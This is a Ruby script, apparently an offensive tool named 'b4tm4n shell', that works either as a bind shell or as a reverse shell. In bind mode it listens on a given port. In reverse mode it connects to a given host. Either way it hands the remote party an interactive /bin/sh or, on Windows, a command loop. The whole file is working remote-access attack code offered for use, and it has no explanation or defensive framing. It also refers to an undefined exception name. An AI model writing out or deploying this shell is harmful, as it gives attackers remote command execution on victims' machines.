#!/usr/bin/env ruby
require 'socket'
require 'pathname'

def sucks
	return RUBY_PLATFORM.downcase.match('mswin|win|mingw')?true:false
end

def realpath(str)
	r=str
	if File.exists?(str)
		r=Pathname.new(str).realpath.to_s
	end
	if sucks then r=r.gsub(/\//,"\\") end
	return r
end

if ARGV.length==1
    ARGV[0]=~/^[0-9]{1,5}$/?p=Integer(ARGV[0]):exit
    s=TCPServer.new("",p)
    c=s.accept
    c.print "b4tm4n shell : connected\n"
    begin
        if not sucks
            f=c.to_i
            exec sprintf("export TERM=xterm;PS1='\$PWD\>';export PS1;/bin/sh -i \<\&%d \>\&%d 2\>\&%d",f,f,f)
        else
            c.print realpath(".")+">"
            while l=c.gets
                raise errorBro if l=~/^die\r?$/
                if not l.chomp==""
                    if l=~/cd .*/i
                        l=l.gsub(/cd /i,'').chomp
                        if File.directory?(l)
                            l=realpath(l)
                            Dir.chdir(l)
                        end
                        c.print realpath(".")+">"
                    elsif l=~/\w:.*/i
                        if File.directory?(l.chomp)
                            Dir.chdir(l.chomp)
                        end
                        c.print realpath(".")+">"
                    else
                        IO.popen(l,"r"){|io|c.print io.read+"\n"+realpath(".")+">"}
                    end
                end
            end
        end
    rescue errorBro
		exit
    ensure
        s.close
        s=nil
    end
elsif ARGV.length==2
	if ARGV[0]=~/^[0-9]{1,5}$/
		p=Integer(ARGV[0]);
		h=ARGV[1]
	else
		exit
	end
	s=TCPSocket.new("#{h}",p)
	s.print "b4tm4n shell : connected\n"
	begin
		if not sucks
			f=s.to_i
			exec sprintf("export TERM=xterm;PS1='\$PWD\>';export PS1;/bin/sh -i \<\&%d \>\&%d 2\>\&%d",f,f,f)
		else
			s.print realpath(".")+">"
			while l=s.gets
				raise errorBro if l=~/^die\r?$/i
				if not l.chomp==""
					if l=~/cd .*/i
						l=l.gsub(/cd /i,'').chomp
						if File.directory?(l)
							l=realpath(l)
							Dir.chdir(l)
						end
						s.print realpath(".")+">"
					elsif l=~/\w:.*/i
						if File.directory?(l.chomp)
							Dir.chdir(l.chomp)
						end
						s.print realpath(".")+">"
					else
						IO.popen(l,"r"){|io|s.print io.read+"\n"+realpath(".")+">"}
					end
				end
			end
		end
	rescue errorBro
		exit
	ensure
		s.close
		s=nil
	end
else
    exit
end